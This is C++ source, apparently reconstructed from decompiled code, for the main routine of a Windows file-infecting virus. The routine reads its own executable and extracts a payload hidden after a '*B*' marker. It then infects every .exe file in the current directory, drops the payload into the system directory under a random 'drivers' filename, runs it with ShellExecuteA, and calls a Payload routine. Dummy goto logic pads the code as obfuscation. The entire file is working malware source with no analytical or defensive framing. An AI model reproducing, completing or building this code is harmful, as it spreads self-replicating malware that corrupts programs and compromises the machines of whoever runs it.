#include "data_globals.h"
#include <fstream>      // added
#include <cstdlib>      // added for malloc, srand, rand
#include <ctime>        // added for time
#include <shellapi.h>   // added for ShellExecuteA
#include <cstring>      // added for strcat, strlen
#pragma optimize("", off)

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    volatile int dummy_state = 1;
    int dummy_return = 0;
    HMODULE hModule = GetModuleHandleA(nullptr);
    GetModuleFileNameA(hModule, Virus, 0x104);
    Secret(Virus);

    inf = 0x2a;
    DAT_140008165 = 0x42;
    DAT_140008166 = 0x2a;

    std::ifstream inFile(reinterpret_cast<const char*>(Virus), std::ios::in | std::ios::binary);
    inFile.seekg(0, std::ios::end);
    std::streampos pos = inFile.tellg();
    int fileSize = static_cast<int>(pos);
    inFile.seekg(0, std::ios::beg);

    VBuffer = static_cast<char*>(malloc(static_cast<size_t>(fileSize)));
    inFile.read(VBuffer, fileSize);
    inFile.close();

    int markerPos = -1;
    for (int i = 0; i < fileSize; ++i) {
        if (VBuffer[i] == '*' && VBuffer[i + 1] == 'B' && VBuffer[i + 2] == '*') {
            markerPos = i;
            FBuffer = VBuffer + i + 3;
            break;
        }
    }

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("*.exe", &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            Infect(findData.cFileName, VBuffer);
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    time_t t = time(nullptr);
    srand(static_cast<unsigned int>(t));
    int randNum = rand();
    char randStr[16];
    sprintf_s(randStr, sizeof(randStr), "%d", randNum);   // replaces itoa

    CHAR systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    strcat(systemPath, "\\drivers");
    strcat(systemPath, randStr);
    strcat(systemPath, ".exe");

    if (FBuffer != nullptr) {
        std::ofstream outFile(systemPath, std::ios::out | std::ios::binary);
        if (markerPos != -1) {
            int payloadSize = fileSize - (markerPos + 3);
            outFile.write(FBuffer, payloadSize);
        }
        outFile.close();
        ShellExecuteA(nullptr, nullptr, systemPath, nullptr, nullptr, 5);
    }

    Payload();
    dummy_return = 0;
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    return dummy_return;

dummy_end:
    return dummy_return;
}
#pragma optimize("", on)
